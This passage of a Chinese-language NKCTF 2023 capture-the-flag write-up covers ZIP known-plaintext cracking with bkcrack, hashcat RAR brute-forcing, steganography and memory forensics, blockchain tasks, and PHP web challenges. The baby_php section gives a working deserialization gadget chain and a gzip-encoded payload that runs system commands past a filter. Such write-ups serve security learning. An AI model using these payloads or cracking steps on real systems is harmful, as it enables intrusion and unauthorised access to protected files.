class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>发现是<code>zip</code></p>
<p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p>
<p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p>
<p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p>
<p>根据提示，猜测是深入明文攻击</p>
<p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p>
<p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p>
<p>使用<code>bkcrack</code>爆破key</p>
<p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p>
<p>修改<code>flag.zip</code>的密码</p>
<p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png"></p>
<p>解压得到flag</p>
<p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p>
<h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p>
<p>ce修改分数到2亿多</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p>
<p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p>
<h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>赛后复现</strong></p>
<p>提示<code>出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗</code></p>
<p>先将图片后多余的数据分离，使用<code>veracrypt</code>挂载，密钥为分离出的<code>png</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png"></p>
<p>得到<code>flag.png</code>，图片尾得到<code>Tips:566*566</code></p>
<p>放大图片观察到很多像素点，提取然后拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p>
<h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现(套娃题)</strong></p>
<p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p>
<p>6位数字爆破，得到<code>114514</code></p>
<p>提示1：<code>“CA1N”也很“疑惑”呢</code></p>
<p>猜测是要对文件异或</p>
<p>文件头为<code>13 08 40 47</code>，与常见文件头进行异或对比，发现异或<code>0x43</code>后为<code>zip</code></p>
<p>得到一个加密的压缩包，根据提示2<code>ZipCrypto</code>，猜测是深入明文攻击</p>
<p><code>echo -n &quot;handsome&quot; &gt; plain.txt</code><br><code>bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-1.png"></p>
<p>改密码</p>
<p><code>bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy</code></p>
<p>解压出来一个<code>handsome.jpg</code>和带密码的<code>5.rar</code></p>
<p>自拍照并没什么用，hashcat爆破<code>rar</code></p>
<p>rar2john提取hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p>
<p>hashcat爆破密码<br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p>
<p>最终得到密码<code>BUSADJ</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-4.png"></p>
<p>解压出的图片尾藏了一个逆序的png</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;6.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p>修改高度，得到压缩包的密码<code>be8b06bc13780abf</code></p>
<p>解压出的<code>GGGGGGG.png</code>结尾有串字符<code>5D93CEB70E2BF5DAA84EC3D0CD2C731A</code></p>
<p>32位的，推测为md5，在线网站得到<code>qwer1234</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-2.png"></p>
<p>拿这个密码去跑<code>cloacked-pixel</code>，得到下一层压缩包密码<code>f442212b3d398a8e</code></p>
<p>根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码<code>764dc6c0361fc0fd</code></p>
<p>看文件头，明显的F5隐写，得到下一层密码<code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p>
<p>wav文件，一听就是sstv了，得到<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-3.png"></p>
<h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p>
<p>先做<code>2023.3.2</code></p>
<p>看的出来，出题人很喜欢明文攻击</p>
<p><a href="https://pcapng.com/">pcapng文件格式</a></p>
<p><code>echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txt</code><br><code>bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8</code><br><code>bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy</code></p>
<p>解压后得到<code>tonF.docx</code>和<code>usb.pcapng</code></p>
<p>对数据包分析，发现是usb键盘流量，使用<code>UsbMiceDataHacker</code>提取<br><code>PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;</code></p>
<p>docx密码为<code>NKCTF2023_YYDS_YYDS!!!</code></p>
<p>进入文档后发现字体为<code>Byxs20_font</code></p>
<p>且文档中的内容复制后与文档内不一样了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-1.png"></p>
<p>odttf转ttf</p>
<p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p>
<p>将<code>\word\fonts\font1.odttf</code>重命名为<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p>
<p>python转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure>

<p>fontforge识别</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-2.png"></p>
<p>得到一半flag：<code>nkctf&#123;ttf_is_funny_</code></p>
<p>接着做<code>2023.3.4</code></p>
<p>内存取证<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-3.png"></p>
<p>提取<code>PYTHON.rar</code></p>
<p><code>python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-4.png"></p>
<p>用这个密钥恢复加密分区</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-5.png"></p>
<p>得到<code>bitlocker_is_very_interesting&#125;</code></p>
<p>最后看<code>2023.3.3</code></p>
<p>hint：<code>flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？</code></p>
<p>根据提示<code>3x3</code>，猜测是4进制</p>
<p>exiftool得到提示<code>上北下南左西右东</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-6.png"></p>
<p>python提取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>得到<code>flag2 is here: images_are_fun_</code></p>
<p>三段flag拼接起来<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p>
<h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p>
<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p>
<p>查看合约代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p>
<p>在<code>metamask</code>中链接题目给的私链</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png"></p>
<p>使用<code>remix ide</code></p>
<p>编译后指定题目部署的地址</p>
<p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png"></p>
<p>在Metamask确认交易请求</p>
<p>等待交易打包，确认上链</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png"></p>
<h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png"></p>
<p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p>
<p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p>
<p>列目录：<code>dir /</code></p>
<p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png"></p>
<p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png"></p>
<h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p>
